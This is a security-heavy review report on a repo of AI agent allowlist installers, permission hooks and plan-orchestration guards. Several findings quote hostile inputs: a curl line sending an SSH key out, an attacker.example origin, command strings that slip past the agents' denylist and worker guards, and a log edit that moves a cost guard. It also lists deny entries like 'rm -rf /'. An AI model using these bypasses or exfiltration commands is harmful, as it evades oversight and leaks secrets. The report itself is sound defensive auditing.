# r1 full review: findings

- Kind: full
- Range: ..fe5a3fe6ad0598c5d76a0673e49c72ef76099a45
- Repo: garyrudolph/public
- Follows: none, the repo's first review
- Reviewers: architecture, contracts, security, tests, duplication, dependencies, hotspots (11 of the facts' top 15; data and test files skipped), docs and standards consistency; Opus, xhigh; floor medium
- Verifier: dropped 0 of 25; split one in two (r1.f3, r1.f10); corrected four locations and three severities or kinds
- Accepted, not raised again: none

Order matters for the installer fixes: r1.f11 before r1.f1, and r1.f4 with or before r1.f1. Once shell entries are wrapped, r1.f11's promotion would keep the old bare strings as user edits, and r1.f1 turns r1.f4's entries on in Claude Code and Cursor CLI. `agents/lib/` is shared byte for byte with the Agerpoint bok, so every `agents/lib` fix is ported there.

## contracts

### r1.f1 - Allowlist installer writes shell rules into Claude Code and Cursor CLI as bare strings neither reads

- Severity: high
- Dimension: contracts
- Kind: fix
- Location: `agents/lib/allowlists.sh:300-332` at fe5a3fe
- Evidence: for `cursor_cli` and `claude`, `render_target_schema` adds `(.shell.allow // [])` and `(.shell.deny // [])` unwrapped, while MCP entries become `Mcp(...)` / `mcp__<server>__*` and WebFetch entries `WebFetch(domain:...)`. Rendering `agents/allowlists/personal.json` puts `"git status"`, `"./gradlew build"` in `permissions.allow` and `"sudo"`, `"rm -rf /"`, `"dd"`, `"mkfs"` in `permissions.deny` of `~/.claude/settings.json` and `~/.cursor/cli-config.json`. The repo's own scout documents the forms these tools take (`personal-allowlist-scout/reference.md` section 3: `Bash(<cmd>:*)`, `Shell(<base>:*)`), and `.claude/settings.json` uses `Bash(make -C agents test)`. So none of the 168 shell allows and none of the shell denies apply in those two tools. `agents/cursor/hooks/enforce-denylist.sh:6-10` says they are honored there; `agents/lib/allowlists-test.sh:471` asserts the bare form; `personal-allowlist-scout/scripts/scan.py:239-255` `_unwrap_token` counts the bare strings as coverage, so the scout never proposes working rules.
- Verified: installed `personal.json` into a sandbox HOME and read both files back; read the scout's reference and the test.
- Recommendation: wrap shell entries per tool (`Bash(<entry>:*)` for Claude Code, `Shell(...)` for Cursor CLI, from the scout's table), fix T15 and the hook comment, and teach `_unwrap_token` that bare entries cover nothing in those two files. Land after r1.f11 and with r1.f4.
- Status: open

### r1.f2 - Allowlist install drops every `permissions` key it doesn't manage from `~/.claude/settings.json`

- Severity: medium
- Dimension: contracts
- Kind: fix
- Location: `agents/lib/allowlists.sh:372-374` at fe5a3fe
- Evidence: the passthrough is `jq -S 'del(.permissions)' "$live"`; promotion and render bring back only `allow` and `deny`. A live file with `ask`, `defaultMode`, `disableBypassPermissionsMode` and `additionalDirectories` comes out of install with only `allow` and `deny`, on every install. The prior copy survives only in `.history/settings.json.N`. Losing `ask` and `disableBypassPermissionsMode` loosens the user's own guards.
- Verified: reproduced in a sandbox HOME.
- Recommendation: delete only `.permissions.allow` and `.permissions.deny` in the passthrough and drop `permissions` only when it's then empty; the existing deep merge restores the rest. Add a test.
- Status: open

## security

### r1.f3 - Session doctor trusts a repo by the owner in its origin URL without checking the host

- Severity: high
- Dimension: security
- Kind: fix
- Location: `plugins/personal/scripts/session-doctor.py:122-135` at fe5a3fe
- Evidence: the docstring makes this the only gate, since plugin hooks run before the harness asks whether to trust a folder. `origin_owner` returns `re.split(r"[:/]", url)[-2]` and never looks at the host, so `https://attacker.example/lolay/x.git` and `https://gitlab.com/GaryRudolph/x.git` both pass and their `make doctor` runs with the session's full environment (`env = {**os.environ, ...}`).
- Verified: reproduced with both origins and a `doctor:` target that creates a file; no test covers a non-GitHub host.
- Recommendation: accept only `github.com`, the `github.com-*` ssh aliases and the cloud proxy form, as `repo-facts.sh` `origin_host` already classifies them; add the cases to `test-session-doctor.sh`. The provenance gap is r1.f10.
- Status: open

### r1.f4 - Global shell allowlist auto-approves reading secrets and sending data out

- Severity: high
- Dimension: security
- Kind: fix
- Location: `agents/allowlists/personal.json:8,97,109-112,180-181` at fe5a3fe
- Evidence: these are prefix rules in the Cursor IDE `terminalAllowlist` and Gemini `commandPrefix` today, and in Claude Code and Cursor CLI once r1.f1 is fixed. `op read op://...` prints any 1Password secret and `op run -- <cmd>` runs anything with secrets in its environment; `curl -G --data-urlencode @$HOME/.ssh/id_ed25519 https://host/` sends a file out as a query string (`curl -G`, `curl --get`, `curl -X GET`, `wget --method=GET`); `git log/show/diff --output=<path>` writes any file. Together that's a no-prompt chain from a prompt-injected session to exfiltration. The scout's own classes would never propose these (`vault read`, `sops -d` are Sensitive).
- Verified: ran `git log --output`, `git fetch --upload-pack`, `rg --pre` and `curl -G --data-urlencode` in a sandbox; read the rendered Gemini TOML. The `rg --pre`, `--upload-pack` and `go test -exec` vectors add little, since the list already approves `pytest` and `make test`.
- Recommendation: remove `op read`, `op run` and the four GET entries; drop `git log/show/diff` from the prefix-only harnesses or narrow Gemini's with `argsPattern`; add `--output`, `--pre` and `--upload-pack` to the scout's classifier.
- Status: open

### r1.f5 - Secrets kit's `$GITHUB_ENV` export prints decrypted secrets in job logs

- Severity: high
- Dimension: security
- Kind: fix
- Location: `plugins/personal/skills/personal-secrets/templates/secrets-repo/dist-decrypt-env.sh:36-42,74-82` at fe5a3fe; `templates/consumer/secrets-steps.yml:41`
- Evidence: the consumer template runs `make -s -C _secrets dist-decrypt-env KEY=AUTH_TOKEN FORMAT=dotenv >> "$GITHUB_ENV"`, and `standards/secrets/README.md:48-50`, `repository.md:132,138` and `makefile.md:97,102` offer the export-everything form too. `print_value` writes `KEY=value` with no `::add-mask::`, and nothing in the repo emits one. Only `secrets.*` values are masked; variables in `GITHUB_ENV` show in every later step's `env:` block, so the plaintext lands in the log, public for a public repo.
- Verified: read the script, template and standard; `grep -r add-mask` finds nothing. The log behavior is GitHub's documented runner behavior, not reproduced here.
- Recommendation: when `GITHUB_ACTIONS=true`, emit `::add-mask::` for each value (each line of a multi-line one) to stdout before the value; update the template and the standard's snippets; add a kit test.
- Status: open

### r1.f6 - Allowlist scout writes `Shell(make:*)` for an approved `make test`, granting every make target

- Severity: high
- Dimension: security
- Kind: fix
- Location: `plugins/workstation/skills/personal-allowlist-scout/scripts/render.py:128-140` at fe5a3fe
- Evidence: `_shell_token` returns `"Shell(%s:*)" % base` for any multi-word segment. Approving `make test` for Cursor CLI writes `Shell(make:*)`, which also grants `make release` and `make deploy`; `npm run build` becomes `Shell(npm:*)`, granting `npm publish`. The scout classifies those as Remote Write, never proposed, and `reference.md` section 4 rule 2 forbids a prefix that subsumes one. On the next scan `_unwrap_token` reads it as prefix `make` and reports later make targets as already covered, so it never resurfaces. `reference.md` section 3's table documents the broad form, contradicting section 4. The workstation plugin has no tests and `make test` doesn't cover it.
- Verified: ran `render.py --harness cursor_cli "make test"` on a scratch repo.
- Recommendation: emit `Shell(make:test)` or skip `cursor_cli` for multi-word segments; fix the reference table; decode `Shell(cmd:args)` in `_unwrap_token`; add render-then-scan tests and a `test-allowlist-scout` target.
- Status: open

### r1.f7 - Cursor denylist hook lets denied commands through and is never tested

- Severity: medium
- Dimension: security
- Kind: fix
- Location: `agents/cursor/hooks/enforce-denylist.sh:235,285-288` at fe5a3fe
- Evidence: line 235 runs `command_is_argv_safe` on the whole line before splitting it into segments, and `argv_is_safe_tool` checks only the first word, so `pytest && rm -rf ~` and `python -m pytest || sudo ls` are allowed. A workspace `.cursor/permissions.json` is consulted, and its `terminalAllowlist` is checked before `ALWAYS_DENY`, so a cloned repo with `{"terminalAllowlist":["sudo","rm"]}` turns off the denies the hook calls "no approval path". `(rm -rf ~)`, `rm -rf  ~` and `echo & sudo whoami` also pass. `agents/lib/hooks-test.sh:51,69` installs an allow-all stub, and `--self-test` is never called.
- Verified: ran the real hook against a sandbox `permissions.json` with each input.
- Recommendation: drop the whole-line shortcut and keep the per-segment check; apply `ALWAYS_DENY` before any allowlist and let a workspace file add denies only; add a behavior test of the real hook and wire `--self-test` into `test-hooks`. Stop describing prefix matching as enforcement.
- Status: open

### r1.f8 - Plan worker and reviewer guards miss shell keywords and wrappers

- Severity: medium
- Dimension: security
- Kind: fix
- Location: `plugins/personal/skills/personal-plan-orchestrate/scripts/worker_guard.py:48,51-58,84,108-109` at fe5a3fe; `reviewer_guard.py`
- Evidence: `START` recognizes a command only after `^`, `[;&|(\`\n]` or `$(` with `sudo|env|command|exec|nohup|time` or `VAR=`. A worker passes with `for d in a b; do git -C "$d" push; done`, `if true; then git push; fi`, `{ git push; }`, `timeout 120 git push`, `nice npm publish`, `xargs -I{} git -C {} push`, `bash -c "make release"`, and a heredoc with an empty body (the `HEREDOC` regex needs a newline before the closing tag). `if make release; then :; fi` is denied, because `PREFIX_WORDS` (line 69) is used only by `named_problem`. The reviewer guard passes `for f in a; do rm -f $f; done`, `timeout 5 rm -f x`, `find . -delete` and `if true; then gh pr merge 1; fi`. `adapters/claude-code.md:375-389` tells the Owner to allow the parent's `git push` and says this guard is what stops a publish script.
- Verified: piped worker and reviewer tool-call JSON into both scripts.
- Recommendation: build `START` from `PREFIX_WORDS` plus `timeout`, `nice`, `xargs` and their flags; re-check the string of `sh|bash|zsh -c` and `eval`; accept an empty heredoc body; add the cases to the tests; soften the adapter's claim.
- Status: open

### r1.f9 - MCP wildcards auto-approve remote writes on seven servers

- Severity: medium
- Dimension: security
- Kind: decision
- Location: `agents/allowlists/personal.json:205-213` at fe5a3fe
- Evidence: `notion:*`, `slack:*`, `miro-mcp:*`, `firebase:*`, `figma:*`, `googledocs:*` and `googleworkspace:*` render as `mcp__slack__*` and so on in Claude Code (valid there), `Mcp(slack:*)` in Cursor CLI and Cursor IDE `mcpAllowlist`. Posting to Slack, writing Notion pages and Google Docs, and Firebase writes and deletes run without a prompt: an outbound channel for a prompt-injected session.
- Verified: rendered the allowlist and read the entries.
- Recommendation: options: (a) allow read and search tools by name and leave writes to a prompt (recommended); (b) keep wildcards only for servers with no write tools; (c) keep them and record the risk.
- Status: open

### r1.f10 - Session doctor runs code from any checkout whose origin names a trusted owner

- Severity: medium
- Dimension: security
- Kind: decision
- Location: `plugins/personal/scripts/session-doctor.py:14-18,144-151` at fe5a3fe
- Evidence: after r1.f3, trust still rests on `.git/config`, which an archive's author controls, and on origin rather than the working tree: `gh pr checkout` of a fork PR in a clone of `GaryRudolph/public` keeps a trusted origin with the contributor's Makefile, and the doctor runs it before the folder-trust prompt.
- Verified: read the gate; follows from the same code as r1.f3.
- Recommendation: options: (a) a direnv-style approval keyed on the repo path and a hash of the doctor's Makefile, Taskfile or triage config, re-asked when it changes (recommended); (b) skip the doctor when `HEAD` isn't an ancestor of the default branch; (c) accept the gap and say so in the docstring.
- Status: open

## hotspots

### r1.f11 - Removing an entry from the allowlist meta-source never removes it from the live file

- Severity: high
- Dimension: hotspots
- Kind: fix
- Location: `agents/lib/allowlists.sh:520-533` at fe5a3fe
- Evidence: `promote_user_edits` builds its baseline from the new meta render plus other orgs' sidecars, not from this org's on-disk sidecar of what was rendered last time. An entry deleted from the meta shows up as `live - expected` and is saved as a user edit. Install `{"shell":{"allow":["git status","rm"]}}`, delete `rm`, install again: every target prints `= no change (idempotent)`, `rm` stays live, `.permissions.user-managed.json` holds it, and `status` says `OK current`. An unsafe allow can't be revoked through the meta, which r1.f4 needs. T07 covers only additions.
- Verified: reproduced in a sandbox HOME.
- Recommendation: use this org's on-disk sidecar as the baseline when it exists, and the meta render only on first install; add the removal test.
- Status: open

### r1.f12 - A malformed live JSON file is replaced with an empty file, and install exits 0

- Severity: high
- Dimension: hotspots
- Kind: fix
- Location: `agents/lib/allowlists.sh:1291,385-390,479-481,505` at fe5a3fe
- Evidence: `apply_one_target ... || true` turns off `set -e` for the whole target, and nothing validates the live file. With a trailing comma in `~/.claude/settings.json`, `extract_passthrough` writes a 0-byte sidecar, `is_empty_object` treats `""` as not empty, the merge fails with "object and null cannot be multiplied", and install prints `+ wrote (0 bytes)` and exits 0. The file's model, hooks and permissions are gone (the original is in `.history/`), and every later install keeps it at 0 bytes as `= no change (idempotent)`. jq's errors do reach stderr.
- Verified: reproduced in a sandbox HOME.
- Recommendation: `jq empty` the live file and each sidecar first; on failure skip the target untouched, set `ABORTED=1` and exit non-zero; replace `|| true` with `|| ABORTED=1`; treat a 0-byte sidecar as an error; add a test.
- Status: open

### r1.f13 - Allowlist first-install guard blocks reinstall after a normal uninstall

- Severity: medium
- Dimension: hotspots
- Kind: fix
- Location: `agents/lib/allowlists.sh:653-669` at fe5a3fe
- Evidence: the guard aborts when `.history/<stem>.json.1` exists without this org's sidecar. Uninstall keeps `.history/` by default, so install, uninstall, install exits 1; and since `.history/` is shared, a second org's first install aborts once the first org has re-rendered. `roundtrip-test.sh:38` sets `REMOVE_HISTORY=yes`, and T08 passes only because org B installs before any `.1` exists. It fails closed with a remedy.
- Verified: reproduced both cases.
- Recommendation: guard only when the live file exists and no sidecar of any org explains it.
- Status: open

### r1.f14 - Allowlist scout classifies make targets without their prerequisites or `$(MAKE)` calls

- Severity: medium
- Dimension: hotspots
- Kind: fix
- Location: `plugins/workstation/skills/personal-allowlist-scout/scripts/scan.py:401-436,448` at fe5a3fe
- Evidence: `parse_makefile_targets` keeps recipe lines and drops prerequisites, and `_classify_text` matches only tool regexes. With `check: lint publish`, `ci:` running `$(MAKE) publish`, and `publish:` running `twine upload`, `make check` and `make ci` are offered as Build & test. Only Unclassified commands get the skill's deeper look.
- Verified: classified a scratch Makefile.
- Recommendation: record prerequisites and `$(MAKE) [-C x] <target>` calls, classify a target as the most restrictive class it reaches, and send what can't be resolved to Unclassified.
- Status: open

### r1.f15 - `release_facts.py` finds no version files when run from a subdirectory

- Severity: medium
- Dimension: hotspots
- Kind: fix
- Location: `plugins/personal/skills/personal-release/scripts/release_facts.py:34-40,176-179` at fe5a3fe
- Evidence: `git ls-files` runs in the current directory, and its cwd-relative paths are joined to the repo root. From `src/` it prints `version fields none found`, `no version.txt at the repo root`, and `--next patch` fails. The docstring says "Run from anywhere inside a repo."
- Verified: reproduced in a scratch repo.
- Recommendation: `git -C <root> ls-files -z`.
- Status: open

### r1.f16 - Orchestrate cost guard can be moved by editing the Cost total or the Token log

- Severity: medium
- Dimension: hotspots
- Kind: decision
- Location: `plugins/personal/skills/personal-plan-orchestrate/scripts/orchestrate_gate.py:494-503` at fe5a3fe; `plan_state.py:356-365`
- Evidence: rule 8 compares only `guard` and `guard_min` with the previous launch. The limit is `max(guard × cost.total, guard_min)` and spend is the Token log's sum, so raising the `**Total**` row (which `kickoff.md:337` allows when recomputing) or deleting Token log lines moves the trip point without `gate-guard`, which raising the multiple needs (`gates.md:85-90`).
- Verified: read the gate and the parser.
- Recommendation: options: (a) compare `cost.limit` with the previous launch, require `gate-guard` when it rises and deny when `cost.actual` falls (recommended); (b) freeze the Total after kickoff and treat any change as gate 0.
- Status: open

## architecture

### r1.f17 - Installer configures `~/.claude`, but the Owner's Claude Code sessions run from `~/.claude-lolay` and `~/.claude-agerpoint`

- Severity: medium
- Dimension: architecture
- Kind: decision
- Location: `agents/Makefile:64,211` at fe5a3fe; `agents/lib/allowlists.sh:92,182`; `agents/lib/local-marketplace.sh:21`
- Evidence: the installer's Claude targets default to `$(HOME)/.claude` and nothing in `agents/` reads `CLAUDE_CONFIG_DIR`. The fish `claude` function (`dotfiles/fish/conf.d/65-aliases.apps.fish:88-101`) sets `CLAUDE_CONFIG_DIR` to `~/.claude-lolay`, or `~/.claude-agerpoint` inside Agerpoint work, and the launchers do the same (`macos-launchers/apps/claude.applescript:12`). So the allowlist goes to a file the default sessions don't read, `make status` reports it installed, the shared-file design between orgs never happens, and the runbook's two ways to add the local marketplace land in different dirs. The plugin side already honors `CLAUDE_CONFIG_DIR` (`session-start.sh:20`). The installer predates the routing.
- Verified: read both sides.
- Recommendation: options: (a) a `CLAUDE_CONFIG_DIRS` list in `local.mk` that the Claude targets loop over, ported to the bok (recommended); (b) a per-machine `CLAUDE_DATA_HOME` override for one dir; (c) keep `~/.claude` and document that routed profiles get no allowlist. Either way, `make status` names the dirs it doesn't manage.
- Status: open

## tests

### r1.f18 - No CI runs `make test` on the agent-authored PRs that merge here

- Severity: medium
- Dimension: tests
- Kind: decision
- Location: repo root at fe5a3fe (no `.github/`); `AGENTS.md:16-17`; `plugins/README.md:83`
- Evidence: the only gate is `AGENTS.md`'s "run `make -C agents validate test`", which nothing enforces; `plugins/README.md:83` says `make validate` "runs before every push", but no hook or CI does. PRs 20 to 41 were squash-merged, most with `Assisted-by`. The PreToolUse guards fail open by design, so a regression that crashes one disables it silently on every synced surface, and `main` is the live version.
- Verified: `git ls-files` shows no workflow outside the secrets kit's template; the suite passed locally apart from the sops skip.
- Recommendation: options: (a) `.github/workflows/test.yml` on `pull_request` running `make -C agents test` on Ubuntu with jq, node, sops and age installed, marked required, plus a macOS job for bash 3.2 (recommended); (b) stay local-only, say so in `AGENTS.md`, and carry the `make test` tail in each PR's Validation section.
- Status: open

### r1.f19 - The secrets kit's keyless guard tests skip whenever sops is missing

- Severity: medium
- Dimension: tests
- Kind: fix
- Location: `plugins/personal/skills/personal-secrets/tests/test-kit.sh:11-16,120-141` at fe5a3fe
- Evidence: the kit's tests exit 0 at the first missing tool among `sops age age-keygen git make`. `check.sh` and the `.githooks/pre-commit` plaintext guard need no sops, but their tests sit behind the same skip. sops is in neither this cloud environment nor `setup/mac`, so the guard is untested where PRs are written. Skip-and-pass is documented intent (`agents/Makefile:439`); the problem is what it hides.
- Verified: `make -C agents test` here printed `SKIP: sops not installed` and exited 0.
- Recommendation: run the keyless cases before the tool check; install sops and age wherever tests run (the cloud setup, and r1.f18's CI).
- Status: open

## dependencies

### r1.f20 - `repo-facts.sh` needs Python 3.12, so its PR template section fails on macOS's python3

- Severity: medium
- Dimension: dependencies
- Kind: fix
- Location: `plugins/personal/skills/personal-repo-baseline/scripts/repo-facts.sh:360` at fe5a3fe
- Evidence: `print(f"  has ## Review guide: {'yes' if re.search(r'^##[ \t]+Review guide[ \t]*$', ...) else 'no'}")` puts a backslash inside an f-string expression, a SyntaxError before 3.12. `/usr/bin/python3` on macOS is 3.9 and the self-hosted runner installs only tmux, gh and git from Homebrew (`setup/mac/claude/README.md:91`), so there the section prints its header, a traceback on stderr, and no facts. Every other script and inline snippet compiles on 3.9.
- Verified: compiled the extracted heredoc under 3.9 and 3.13.
- Recommendation: compute the yes/no outside the f-string; state the floor in the header.
- Status: open

### r1.f21 - Workflow templates pin Node 20 action majors, repeated in five files

- Severity: medium
- Dimension: dependencies
- Kind: fix
- Location: `plugins/personal/skills/personal-release/templates/release.yml:37` at fe5a3fe; `templates/changelog.yml:27`; `personal-secrets/templates/secrets-repo/.github/workflows/freshness.yml:18`; `templates/consumer/secrets-steps.yml:12,21,29`
- Evidence: `actions/checkout@v4`, `actions/create-github-app-token@v1` and `nhedger/setup-sops@v2` all declare `using: node20`; current majors are checkout v7, create-github-app-token v3 and setup-sops v3, all Node 24. The same pins repeat in `standards/versioning.md:109` and `standards/secrets/repository.md:99,108,116`. `architecture.md` "Starting New Projects" says to pin the latest stable, and these templates seed new repos. create-github-app-token v3 deprecates `app-id` for `client-id`.
- Verified: fetched each `action.yml` at the pinned and current tags. GitHub's Node 20 removal date wasn't confirmed; this rests on the drift.
- Recommendation: bump the three, switching to `client-id`; keep pins only in the templates with the standards pointing at them, or assert that every `uses:` pin agrees in `manifests-check.py`.
- Status: open

### r1.f22 - No `doctor` and no declared toolchain floors for this repo

- Severity: medium
- Dimension: dependencies
- Kind: decision
- Location: `agents/Makefile:242-250` at fe5a3fe
- Evidence: `makefile.md` puts `doctor` in every leaf's vocabulary; `agents/Makefile` has none, the repo root has no Makefile or `triage.yaml`, so the plugin's own session doctor never checks this repo. The only declared floors are "Python 3.8+" in two scout scripts and a Claude Code version in prose; the real Python floors are 3.9 (`removesuffix` in `session-doctor.py`) and 3.12 (r1.f20). jq, git and `claude` are hard requirements of `make validate test`.
- Verified: read the Makefile and the scripts; compiled under 3.9.
- Recommendation: options: (a) a `doctor` in `agents/Makefile` and a root `triage.yaml` erroring on python3, git, jq, make and claude below their floors and warning on sops, age and node (recommended); (b) record that this installer repo is exempt and list its prerequisites in `agents/README.md`.
- Status: open

## duplication

### r1.f23 - `review_facts.py` can't read owner and repo from the proxy, alias or `ssh://` origins

- Severity: medium
- Dimension: duplication
- Kind: fix
- Location: `plugins/personal/skills/personal-review-guide/scripts/review_facts.py:75,133-135` at fe5a3fe
- Evidence: `GITHUB_REMOTE = re.compile(r"github\.com[:/]+([^/]+)/([^/]+?)(?:\.git)?/*$")` returns nothing for the cloud proxy (`http://local_proxy@127.0.0.1:<port>/git/o/r`), `git@github.com-work:o/r.git` and `ssh://git@ssh.github.com:443/o/r.git`, which `repo-facts.sh`, `review_log_facts.py` and `session-doctor.py` all handle. It prints `github_repo: none`, and the review guide builds every diff link from that, so cloud sessions can't link a guide from the facts.
- Verified: ran the regex on each form.
- Recommendation: one origin parser the facts scripts load (as `review_log_facts.py` loads the bucket table), or at least `repo-facts.sh`'s rule; add proxy and alias cases to the test.
- Status: open

### r1.f24 - `secrets-facts.sh` prints origin's URL with any token in it

- Severity: medium
- Dimension: duplication
- Kind: fix
- Location: `plugins/personal/skills/personal-secrets/scripts/secrets-facts.sh:35` at fe5a3fe
- Evidence: `printf '  remote: %s\n' "$(git remote get-url origin ...)"`, though the header promises "never a secret value". `repo-facts.sh:94-111` has `redact_url` because a token can sit in an https URL's user part; this copy never got it, in the skill that runs in secrets repos.
- Verified: read both scripts.
- Recommendation: mask the userinfo as `redact_url` does, or share the helper with r1.f23's parser.
- Status: open

## docs

### r1.f25 - documentation.md says to strike through finished plan steps, which the plan parser reads as unfinished

- Severity: medium
- Dimension: docs
- Kind: fix
- Location: `plugins/personal/skills/personal-standards/standards/documentation.md:111-121` at fe5a3fe
- Evidence: documentation.md applies `s{N}` naming to plan files (".scratch/plan-..." in its example) and says to mark one complete with `#### ~~s2 - Wire search results~~`; core.md points there. plan-execution.md "Marking steps done" makes ` (done)` the only sanctioned mutation, and `plan_state.py` follows it: `#### ~~s1 - [exec] ...~~` comes back as next-wave step `~~s1`.
- Verified: ran `plan_state.state()` on both forms.
- Recommendation: limit strikethrough to spec headings and checklists outside a tagged plan, and point plan files at plan-execution.md.
- Status: open

### r1.f26 - A passive driver's next-wave session on a runner starts on a branch without the plan

- Severity: medium
- Dimension: docs
- Kind: fix
- Location: `plugins/personal/skills/personal-standards/standards/git.md:74` at fe5a3fe; `plan-execution.md:607,614,740`; `personal-plan-model-tiers/SKILL.md:314-325`
- Evidence: `personal-plan-model-tiers` queues each next wave with `spawn_task`; on a runner that session gets its own `claude/...` branch from the default branch, and git.md:74 and plan-execution.md:614 say to work there. The plan and earlier waves are on the previous task branch. Only orchestrate's `kickoff.md:308-318` path (b) fast-forwards the fresh branch, and plan-execution.md:740's `create_session` on the task branch isn't in the passive skill.
- Verified: read the four files.
- Recommendation: move kickoff.md path (b) into git.md for any pasted `On branch` on a runner; have model-tiers step 7 use `create_session` on the task branch where the harness has it.
- Status: open
